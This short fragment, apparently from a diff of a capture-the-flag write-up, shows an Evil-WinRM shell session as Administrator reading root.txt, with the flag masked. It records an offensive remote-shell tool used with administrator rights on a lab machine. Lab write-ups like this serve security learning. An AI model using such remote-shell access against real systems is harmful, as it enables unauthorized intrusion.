+~$ *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+**********************************
+```
+
+
+
+
+
+
+
